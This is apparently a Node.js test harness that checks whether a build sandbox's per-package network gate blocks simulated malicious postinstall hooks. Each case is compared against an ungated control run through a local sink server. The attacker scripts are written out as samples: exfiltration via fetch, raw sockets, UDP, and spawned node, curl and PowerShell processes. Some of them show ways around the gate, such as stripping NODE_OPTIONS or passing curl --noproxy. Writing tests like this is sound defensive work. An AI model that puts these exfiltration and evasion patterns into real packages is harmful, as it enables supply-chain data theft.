// Measures the build jail's per-package network gate (`net_gate_shim.js`) end to end, through
// the SAME delivery channel production uses: a base64 `data:text/javascript` module on
// `NODE_OPTIONS=--import`, matching `compiler::defaults::data_url_import`.
//
// SCOPE. Egress is a per-package BOOLEAN — a catalog entry means network on, no entry means
// network off. Per-host permissioning was evaluated and dropped (a redirect is a second
// connection to a second host, so an origin-only allowlist denies the download at the second
// hop), so this harness has no host-refinement, redirect or catalog-host arms.
//
// RELATIONSHIP TO THE TEST SUITE. The behaviours that must never regress silently — the
// `NODE_OPTIONS` re-stamp and the single-seam call shape — are pinned in
// `crates/nub-sandbox/tests/net_gate_semantics.rs`, which CI runs and which builds its stamp
// with the production generator. This harness is the wider exploratory sweep: it stands up a
// real off-box sink and judges every arm on the SINK's hit count, which no unit test does.
//
// WHY THE SINK IS NOT ON LOOPBACK. The gate permits loopback by default (a build that starts a
// local server must keep working), so a sink on `127.0.0.1` would be ALLOWED and every arm would
// pass for the wrong reason. The sink therefore binds a real non-loopback interface address, so
// reaching it is shaped like genuine off-box egress. A dedicated arm covers loopback denial.
//
// WHY THE SINK COUNTS HITS. Each attacker script self-reports, but a self-report is not
// evidence — the authority is the SERVER seeing a request arrive. Every arm is judged on the
// sink's own hit count for that arm's unique path, so a "blocked" verdict means no byte arrived.
//
// Every arm runs twice: once with the gate and once WITHOUT (the control). A blocked arm means
// nothing unless the paired control shows the same exfiltration succeeding.

import http from "node:http";
import os from "node:os";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { spawn } from "node:child_process";

// ⚠️ `spawnSync` CANNOT be used here, and using it produced a false result once. The sink server
// lives in THIS process, so a synchronous spawn blocks the event loop: the child's request is
// accepted by the kernel but the sink cannot RESPOND until the child has already exited, so the
// child times out, reports nothing, and the sink records the hit afterwards. Every arm then looks
// identical — which reads exactly like "the gate does nothing" — for a reason that has nothing to
// do with the gate. Async spawn keeps the loop free so the sink can answer while the child waits.
function runChild(code, env, timeout = 15000) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, ["-e", code], { env });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (d) => (stdout += d));
    child.stderr.on("data", (d) => (stderr += d));
    const timer = setTimeout(() => child.kill("SIGKILL"), timeout);
    child.on("close", (status) => {
      clearTimeout(timer);
      resolve({ stdout: stdout.trim(), stderr: stderr.trim().split("\n")[0] || "", status });
    });
  });
}

const here = path.dirname(fileURLToPath(import.meta.url));
const SHIM = path.join(here, "..", "..", "crates", "nub-sandbox", "src", "backend", "net_gate_shim.js");

// Mirrors `data_url_import` in compiler/defaults.rs. Base64 rather than percent-encoding
// because NODE_OPTIONS is split on WHITESPACE and base64's alphabet contains none, which makes
// silent truncation of the preload structurally unreachable instead of merely avoided.
const b64 = (src) => Buffer.from(src, "utf8").toString("base64");

function nodeOptionsFor(policy) {
  const js = fs.readFileSync(SHIM, "utf8").replace("__NUB_NET_POLICY_JSON__", JSON.stringify(policy));
  return `--import data:text/javascript;base64,${b64(js)}`;
}

function lanAddress() {
  for (const addrs of Object.values(os.networkInterfaces()))
    for (const a of addrs) if (a.family === "IPv4" && !a.internal) return a.address;
  return null;
}

const HOST = lanAddress();
if (!HOST) {
  console.error("no non-loopback IPv4 interface: cannot build an honest control arm");
  process.exit(2);
}

const hits = new Map();
const sink = http.createServer((req, res) => {
  const tag = req.url.slice(1);
  hits.set(tag, (hits.get(tag) || 0) + 1);
  res.end("stolen");
});
await new Promise((r) => sink.listen(0, "0.0.0.0", r));
const PORT = sink.address().port;

// ── the attacker scripts ────────────────────────────────────────────────────────────────
// Each is what a freshly-published malicious postinstall hook plausibly looks like.
const scripts = {
  "https.get": `
    const http = require("node:http");
    http.get(process.env.SINK, (r) => { r.resume(); console.log("REACHED"); })
        .on("error", (e) => console.log("BLOCKED " + e.code + " " + (e.nubReason||"")));`,
  fetch: `
    fetch(process.env.SINK).then(() => console.log("REACHED"),
      (e) => console.log("BLOCKED " + (e.cause?.code||e.code||"?") + " " + (e.cause?.nubReason||"")));`,
  "net.connect": `
    const net = require("node:net");
    const s = net.connect(Number(process.env.PORT), process.env.HOST, () => {
      s.write("GET /" + process.env.TAG + " HTTP/1.0\\r\\n\\r\\n");
      setTimeout(() => { console.log("REACHED"); process.exit(0); }, 300);
    });
    s.on("error", (e) => console.log("BLOCKED " + e.code + " " + (e.nubReason||"")));`,
  // Resolves the sink's own literal address: `dns.lookup` answers an IP literal from memory, so
  // the control arm succeeds with no working external resolver. A real hostname made the CONTROL
  // arm fail too on an offline host, which destroys the differential.
  "dns.lookup": `
    require("node:dns").lookup(process.env.HOST, (e) =>
      console.log(e ? "BLOCKED " + e.code + " " + (e.nubReason||"") : "REACHED"));`,
  "dgram.send": `
    const s = require("node:dgram").createSocket("udp4");
    s.send("stolen", 9999, "8.8.8.8", (e) =>
      { console.log(e ? "BLOCKED " + e.code + " " + (e.nubReason||"") : "REACHED"); s.close(); });`,
  // The child-process cases: does the gate survive a spawn?
  "spawn node (inherit)": `
    const { spawnSync } = require("node:child_process");
    const r = spawnSync(process.execPath, ["-e",
      'fetch(process.env.SINK).then(()=>console.log("REACHED"),e=>console.log("BLOCKED "+(e.cause?.code||"?")))'],
      { encoding: "utf8" });
    process.stdout.write(r.stdout || ("spawn failed: " + r.stderr));`,
  "spawn node (env wiped)": `
    const { spawnSync } = require("node:child_process");
    const env = { ...process.env }; delete env.NODE_OPTIONS;
    const r = spawnSync(process.execPath, ["-e",
      'fetch(process.env.SINK).then(()=>console.log("REACHED"),e=>console.log("BLOCKED "+(e.cause?.code||"?")))'],
      { encoding: "utf8", env });
    process.stdout.write(r.stdout || ("spawn failed: " + r.stderr));`,
  "spawn curl (non-Node)": `
    const { spawnSync } = require("node:child_process");
    const r = spawnSync("curl", ["-s", "-m", "5", process.env.SINK], { encoding: "utf8" });
    console.log(r.status === 0 && r.stdout ? "REACHED" : "BLOCKED curl-status-" + r.status);`,
  // The honest residual: a client that is TOLD to ignore proxy configuration. Expected to REACH
  // even under a full deny — recorded so the report cannot overstate what the tier buys.
  "spawn curl --noproxy": `
    const { spawnSync } = require("node:child_process");
    const r = spawnSync("curl", ["-s", "-m", "5", "--noproxy", "*", process.env.SINK], { encoding: "utf8" });
    console.log(r.status === 0 && r.stdout ? "REACHED" : "BLOCKED curl-status-" + r.status);`,
  // A script that hands the child a hand-built env, not a copy of its own.
  "spawn node (env replaced)": `
    const { spawnSync } = require("node:child_process");
    const r = spawnSync(process.execPath, ["-e",
      'fetch(process.env.SINK).then(()=>console.log("REACHED"),e=>console.log("BLOCKED "+(e.cause?.code||"?")))'],
      { encoding: "utf8", env: { SINK: process.env.SINK, PATH: process.env.PATH } });
    process.stdout.write(r.stdout || ("spawn failed: " + r.stderr));`,
};

async function run(name, policy, tagSuffix) {
  const tag = `${name}-${tagSuffix}`.replace(/[^a-zA-Z0-9.-]/g, "_");
  const env = {
    ...process.env,
    SINK: `http://${HOST}:${PORT}/${tag}`,
    HOST,
    PORT: String(PORT),
    TAG: tag,
  };
  if (policy) env.NODE_OPTIONS = nodeOptionsFor(policy);
  else delete env.NODE_OPTIONS;
  return { tag, ...(await runChild(scripts[name], env)) };
}

// ── arms ────────────────────────────────────────────────────────────────────────────────
const DENIED = { package: "chalk", allow: false };
const ALLOWED = { package: "playwright", allow: true };

console.log(`sink: http://${HOST}:${PORT}  (non-loopback, so the loopback exemption cannot confound)`);
console.log(`node: ${process.version}  platform: ${process.platform}\n`);

const rows = [];
for (const name of Object.keys(scripts)) {
  const ctrl = await run(name, null, "control");
  const deny = await run(name, DENIED, "denied");
  const allow = await run(name, ALLOWED, "allowed");
  rows.push({ name, ctrl, deny, allow });
}
await new Promise((r) => setTimeout(r, 500)); // let in-flight sink writes land

const verdict = (r) => {
  const arrived = hits.get(r.tag) || 0;
  const said = /REACHED/.test(r.stdout) ? "REACHED" : /BLOCKED/.test(r.stdout) ? "BLOCKED" : "?";
  return { said, arrived, raw: r.stdout.split("\n").pop() || r.stderr };
};

const pad = (s, n) => String(s).padEnd(n);
console.log(pad("attack", 24) + pad("no-jail CONTROL", 22) + pad("allow:false", 22) + "allow:true");
console.log("-".repeat(92));
for (const { name, ctrl, deny, allow } of rows) {
  const c = verdict(ctrl), d = verdict(deny), a = verdict(allow);
  const cell = (v) => pad(`${v.said} (sink:${v.arrived})`, 22);
  console.log(pad(name, 24) + cell(c) + cell(d) + `${a.said} (sink:${a.arrived})`);
}
console.log("\n--- raw child output (so a '?' verdict is diagnosable, never guessed) ---");
for (const { name, ctrl, deny, allow } of rows) {
  console.log(`  ${name}`);
  for (const [label, r] of [["control", ctrl], ["deny   ", deny], ["allow  ", allow]]) {
    console.log(`      ${label}: rc=${r.status} out=${JSON.stringify(r.stdout.slice(0, 110))}${r.stderr ? " err=" + JSON.stringify(r.stderr.slice(0, 70)) : ""}`);
  }
}

console.log("\n--- denial messages seen under allow:false ---");
for (const { name, deny } of rows) {
  const line = deny.stdout.split("\n").pop();
  if (/BLOCKED/.test(line)) console.log(`  ${pad(name, 24)} ${line}`);
}

// ── loopback: exempt under a deny, deliberately ─────────────────────────────────────────
//
// Not host permissioning — there is no list and nothing per-package about it. Loopback cannot
// carry data off the box, and a build that starts a local server is common enough that denying
// it would break packages, which is the cost this design is optimised against.
console.log("\n--- loopback under a full deny (exempt by design) ---");
{
  const env = { ...process.env, NODE_OPTIONS: nodeOptionsFor({ package: "chalk", allow: false }) };
  const r = await runChild(
    `const net=require("node:net");const s=net.connect(${PORT},"127.0.0.1",()=>{console.log("REACHED");process.exit(0)});s.on("error",e=>console.log("BLOCKED "+e.code))`,
    env, 8000);
  console.log(`  ${pad("allow:false, loopback target", 32)} ${(r.stdout || r.stderr).split("\n").pop()}`);
}

// ── Windows-only arms ───────────────────────────────────────────────────────────────────
// Two things cannot be measured off Windows: whether both shims delivered together survive the
// real Windows environment block, and whether PowerShell — the one non-Node child a real
// postinstall plausibly reaches for — is covered by the blackhole proxy.
if (process.platform === "win32") {
  console.log("\n=== Windows-only arms ===");

  // 1. Delivery of BOTH shims on one value, at the size the production encoding actually
  //    produces. The documented 32,767-character Windows env cap governs
  //    `SetEnvironmentVariable`, NOT the environment BLOCK `CreateProcess` receives — which is
  //    how Node spawns — and real windows-latest accepted 49,381 chars and armed the gate
  //    (run 30503464536). So this is a delivery regression check, not an open question.
  const stdioShim = fs.readFileSync(
    path.join(here, "..", "..", "crates", "nub-sandbox", "src", "backend", "windows_stdio_shim.js"), "utf8");
  const gateJs = fs.readFileSync(SHIM, "utf8").replace("__NUB_NET_POLICY_JSON__", JSON.stringify(DENIED));
  const both = `--import data:text/javascript;base64,${b64(stdioShim)} --import data:text/javascript;base64,${b64(gateJs)}`;
  {
    const r = await runChild(
      `const net=require("node:net");const s=net.connect(80,${JSON.stringify(HOST)},()=>console.log("GATE-NOT-ARMED"));s.on("error",e=>console.log(e.nubReason==="ERR_NUB_JAIL_NET_DENIED"?"GATE-ARMED":"other:"+e.code))`,
      { ...process.env, NODE_OPTIONS: both, __NUB_JAIL_STDIO_SHIM_FORCE: "1" }, 10000);
    console.log(`  ${pad("both shims, base64", 28)} len=${String(both.length).padStart(6)}  rc=${r.status}  ${JSON.stringify((r.stdout || r.stderr).slice(0, 90))}`);
  }

  // 2. PowerShell. Docs say PS7+ HttpClient reads proxy env vars while Windows PowerShell 5.1
  //    reads HKCU instead — so the two are expected to differ, and that difference is the point.
  for (const exe of ["powershell", "pwsh"]) {
    for (const [label, policy] of [["no jail (control)", null], ["allow:false", DENIED]]) {
      const tag = `ps-${exe}-${label.replace(/\W/g, "")}`;
      const env = { ...process.env, SINK: `http://${HOST}:${PORT}/${tag}` };
      if (policy) env.NODE_OPTIONS = nodeOptionsFor(policy);
      else delete env.NODE_OPTIONS;
      const r = await runChild(
        `const {spawnSync}=require("node:child_process");
         const r=spawnSync(${JSON.stringify(exe)},["-NoProfile","-Command","try{$r=Invoke-WebRequest -Uri $env:SINK -UseBasicParsing -TimeoutSec 5;Write-Output ('REACHED '+$r.StatusCode)}catch{Write-Output ('BLOCKED '+$_.Exception.GetType().Name)}"],{encoding:"utf8"});
         console.log((r.stdout||"").trim()||("spawn-failed rc="+r.status));`,
        env, 25000);
      await new Promise((res) => setTimeout(res, 300));
      console.log(`  ${pad(exe + " " + label, 30)} sink=${hits.get(tag) || 0}  ${JSON.stringify((r.stdout || r.stderr).slice(0, 90))}`);
    }
  }
}

sink.close();
